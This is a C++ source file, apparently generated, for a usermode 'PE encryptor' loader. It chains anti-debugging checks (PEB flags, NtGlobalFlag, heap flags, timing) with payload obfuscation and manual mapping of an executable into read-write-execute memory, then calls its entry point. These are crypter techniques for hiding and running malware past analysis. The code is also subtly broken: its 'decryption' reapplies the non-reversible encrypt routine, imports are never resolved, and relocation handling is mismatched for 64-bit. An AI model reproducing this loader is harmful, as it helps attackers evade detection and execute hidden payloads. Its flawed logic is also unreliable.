// Ring3 PE Encryptor Usermode - Generation ID: 498745
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>

class Ring398200 {
private:
    static constexpr DWORD ENCRYPTION_KEY = 0xeb4208cd;
    static constexpr DWORD XOR_MASK = 0x55b3cb;

    bool antiDbg4987() {
        // Multiple anti-debug checks
        if (IsDebuggerPresent()) return false;
        
        // PEB check
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return false;
        
        // NtGlobalFlag check
        if (peb->NtGlobalFlag & 0x70) return false;
        
        // Heap flags check
        PVOID heap = peb->ProcessHeap;
        DWORD heapFlags = *(DWORD*)((BYTE*)heap + 0x40);
        if (heapFlags & 0x2) return false;
        
        // Timing check
        LARGE_INTEGER start, end, freq;
        QueryPerformanceCounter(&start);
        Sleep(100);
        QueryPerformanceCounter(&end);
        QueryPerformanceFrequency(&freq);
        
        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        if (elapsed > 0.2) return false;  // Debugger detected
        
        return true;
    }

    void encrypt7904(BYTE* data, SIZE_T size) {
        for (SIZE_T i = 0; i < size; i++) {
            data[i] ^= (ENCRYPTION_KEY >> (i % 32)) & 0xFF;
            data[i] = _rotl8(data[i], 3);
            data[i] += (XOR_MASK >> (i % 24)) & 0xFF;
        }
    }

    bool load61425(BYTE* peData, SIZE_T size) {
        if (!peData || size < sizeof(IMAGE_DOS_HEADER)) return false;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;
        
        // Allocate memory for the PE
        LPVOID baseAddr = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase,
                                       ntHeaders->OptionalHeader.SizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!baseAddr) {
            baseAddr = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        
        if (!baseAddr) return false;
        
        // Copy headers
        memcpy(baseAddr, peData, ntHeaders->OptionalHeader.SizeOfHeaders);
        
        // Copy sections
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionAddr = (BYTE*)baseAddr + sectionHeader[i].VirtualAddress;
            memcpy(sectionAddr, peData + sectionHeader[i].PointerToRawData,
                   sectionHeader[i].SizeOfRawData);
        }
        
        // Process relocations
        DWORD_PTR delta = (DWORD_PTR)baseAddr - ntHeaders->OptionalHeader.ImageBase;
        if (delta != 0) {
            // Process relocation table
            PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocDir->Size > 0) {
                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddr + relocDir->VirtualAddress);
                while (reloc->VirtualAddress > 0) {
                    WORD* relocData = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                    int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    
                    for (int j = 0; j < numEntries; j++) {
                        if ((relocData[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                            DWORD* patchAddr = (DWORD*)((BYTE*)baseAddr + reloc->VirtualAddress + (relocData[j] & 0xFFF));
                            *patchAddr += (DWORD)delta;
                        }
                    }
                    reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
                }
            }
        }
        
        // Execute
        DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
        void (*peEntry)() = (void(*)())((BYTE*)baseAddr + entryPoint);
        peEntry();
        
        return true;
    }

public:
    bool ProcessEncryptedPE(const std::vector<BYTE>& encryptedData) {
        if (!antiDbg4987()) return false;
        
        std::vector<BYTE> decryptedData = encryptedData;
        encrypt7904(decryptedData.data(), decryptedData.size());
        
        return load61425(decryptedData.data(), decryptedData.size());
    }
};

